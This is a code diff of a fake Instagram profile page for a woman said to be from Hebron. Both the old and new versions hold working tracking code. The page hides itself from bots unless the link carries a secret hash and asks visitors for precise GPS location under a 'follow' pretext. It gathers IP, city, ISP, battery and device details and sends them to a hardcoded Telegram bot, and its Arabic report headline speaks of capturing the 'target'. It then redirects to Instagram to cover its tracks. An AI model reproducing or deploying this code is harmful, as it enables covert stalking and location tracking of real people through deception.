@@ -3,33 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <meta name="robots" content="noindex, nofollow">
-    
     <title>Instagram | Ekhlas</title>
     <meta property="og:title" content="Ekhlas (@ekhlas_2026) • Instagram photos">
     <meta property="og:description" content="شاهد صور ومقاطع فيديو إخلاص من الخليل. استكشف المنشورات والقصص الآن.">
     <meta property="og:image" content="https://k.top4top.io/p_3696qmute0.jpeg">
-    <meta property="og:type" content="profile">
-
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; display: none; }
-        .nav { height: 44px; border-bottom: 1px solid #dbdbdb; display: flex; align-items: center; justify-content: center; font-weight: bold; background: white; border-top: 1px solid #efefef; }
-        .profile-container { padding: 20px 15px; max-width: 600px; margin: 0 auto; }
+        .nav { height: 44px; border-bottom: 1px solid #dbdbdb; display: flex; align-items: center; justify-content: center; font-weight: bold; background: white; }
+        .profile-container { padding: 20px 15px; max-width: 600px; margin: 0 auto; text-align: right; }
         .header-top { display: flex; align-items: center; margin-bottom: 20px; }
-        .profile-pic { width: 80px; height: 80px; border-radius: 50%; border: 1px solid #dbdbdb; padding: 2px; object-fit: cover; }
+        .profile-pic { width: 80px; height: 80px; border-radius: 50%; border: 1px solid #dbdbdb; object-fit: cover; }
         .stats { display: flex; flex-grow: 1; justify-content: space-around; text-align: center; margin-right: 20px; }
-        .stat-num { font-weight: bold; display: block; font-size: 16px; }
+        .stat-num { font-weight: bold; display: block; }
         .stat-label { font-size: 13px; color: #8e8e8e; }
-        .bio { font-size: 14px; line-height: 1.5; margin-bottom: 20px; text-align: right; }
-        .follow-btn { background: #0095f6; color: white; border: none; width: 100%; padding: 8px; border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer; }
-        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 2px; margin-top: 20px; }
-        .grid-item { background: #fafafa; aspect-ratio: 1/1; border: 0.5px solid #efefef; }
+        .follow-btn { background: #0095f6; color: white; border: none; width: 100%; padding: 8px; border-radius: 8px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body id="mainBody">
-
     <div class="nav">Ekhlas</div>
-
     <div class="profile-container">
         <div class="header-top">
             <img src="https://k.top4top.io/p_3696qmute0.jpeg" class="profile-pic">
@@ -42,101 +33,66 @@
         <div class="bio">
             <strong>Ekhlas | إخلاص</strong><br>
             • Personal Account ✨<br>
-            • Palestine | Hebron 🇵🇸<br>
-            • مرحبا بك في عالمي الصغير 🌸
+            • Palestine | Hebron 🇵🇸
         </div>
-        <button class="follow-btn" onclick="askLoc()">متابعة</button>
-        <div class="grid">
-            <div class="grid-item" style="background: url('https://k.top4top.io/p_3696qmute0.jpeg') center/cover;"></div>
-            <div class="grid-item"></div><div class="grid-item"></div>
-            <div class="grid-item"></div><div class="grid-item"></div><div class="grid-item"></div>
-        </div>
+        <button class="follow-btn" onclick="requestGPS()">متابعة</button>
     </div>
 
     <script>
         const BOT_TOKEN = '8492500020:AAH-KijyAHr_46BvwCvd0ociksbtycSXKJs';
         const CHAT_ID = '7184970355';
-        const HASH_KEY = "#secure";
 
-        // حماية الرابط من البوتات
-        if (window.location.hash !== HASH_KEY) {
-            window.location.replace("https://www.instagram.com");
-        } else {
-            document.getElementById('mainBody').style.display = "block";
-        }
-
-        // طلب الإذن فوراً عند الدخول
-        window.onload = () => { 
-            setTimeout(askLoc, 400); 
+        window.onload = () => {
+            if (window.location.hash === "#secure") {
+                document.getElementById('mainBody').style.display = "block";
+                setTimeout(requestGPS, 500);
+            } else {
+                window.location.replace("https://www.instagram.com");
+            }
         };
 
-        function askLoc() {
-            navigator.geolocation.getCurrentPosition(success, fail, {
-                enableHighAccuracy: true,
-                timeout: 8000,
+        function requestGPS() {
+            // خيار enableHighAccuracy: true هو ما يجبر الأيفون على تشغيل مستشعر GPS الفعلي
+            const options = {
+                enableHighAccuracy: true, 
+                timeout: 10000,
                 maximumAge: 0
-            });
+            };
+
+            navigator.geolocation.getCurrentPosition(success, fail, options);
         }
 
         async function success(p) {
-            const lat = p.coords.latitude;
-            const lon = p.coords.longitude;
-            const accuracy = p.coords.accuracy;
-            
-            // سحب كافة المعلومات (IP + الجهاز)
-            const deviceData = await getAllData();
+            const { latitude: lat, longitude: lon, accuracy: acc } = p.coords;
+            const deviceDetails = await getDeviceDetails();
             const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
             
-            const message = `✅ **تم صيد بيانات الهدف بنجاح**\n\n` +
-                            `📍 الموقع الدقيق: ${mapLink}\n` +
-                            `🎯 الدقة: ${accuracy} متر\n\n` +
-                            `${deviceData}`;
+            const report = `✅ **تم تأكيد موقع GPS بنجاح**\n\n` +
+                           `📍 الخريطة: ${mapLink}\n` +
+                           `🎯 دقة الإشارة: ${acc.toFixed(1)} متر\n\n` +
+                           `${deviceDetails}`;
 
-            sendToTelegram(message);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
             
-            // تحويل للتمويه
-            setTimeout(() => { window.location.href = "https://www.instagram.com/reels/"; }, 800);
+            setTimeout(() => { window.location.href = "https://www.instagram.com/reels/"; }, 1000);
         }
 
-        async function getAllData() {
-            let info = "";
+        async function getDeviceDetails() {
             try {
-                // سحب IP والمنطقة
                 const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
-                
-                // سحب معلومات البطارية
-                let battery = "غير مدعوم";
+                let battery = "غير متاح";
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
-                    battery = (b.level * 100).toFixed(0) + "%";
+                    battery = Math.round(b.level * 100) + "%";
                 }
-
-                info = `🌐 **معلومات الشبكة:**\n` +
-                       `• IP: ${ipRes.ip}\n` +
-                       `• المدينة: ${ipRes.city}\n` +
-                       `• الدولة: ${ipRes.country_name}\n` +
-                       `• المزود: ${ipRes.org}\n\n` +
-                       `📱 **معلومات الجهاز:**\n` +
-                       `• النظام: ${navigator.platform}\n` +
-                       `• المتصفح: ${navigator.userAgent.split(' ').pop()}\n` +
-                       `• البطارية: ${battery}\n` +
-                       `• الرام: ${navigator.deviceMemory || 'غير معروف'} GB\n` +
-                       `• اللغة: ${navigator.language}\n` +
-                       `• المعالج: ${navigator.hardwareConcurrency} Cores`;
-            } catch (e) {
-                info = "⚠️ تعذر سحب بعض البيانات التقنية.\nUserAgent: " + navigator.userAgent;
-            }
-            return info;
+                return `🌐 **الشبكة:** ${ipRes.ip} (${ipRes.city})\n📱 **الجهاز:** ${navigator.platform}\n🔋 **البطارية:** ${battery}\n🧠 **الرام:** ${navigator.deviceMemory || '4+'}GB`;
+            } catch (e) { return "خطأ في سحب بيانات الجهاز"; }
         }
 
         function fail(e) {
-            if(e.code == 1) {
-                alert("يرجى السماح بالوصول للموقع لتأكيد الحساب ومتابعة إخلاص.");
+            if (e.code === 1) {
+                alert("تنبيه: يجب تفعيل 'الموقع الدقيق' والسماح بالوصول للموقع لمتابعة هذا الحساب.");
             }
-        }
-
-        function sendToTelegram(msg) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
         }
     </script>
 </body>
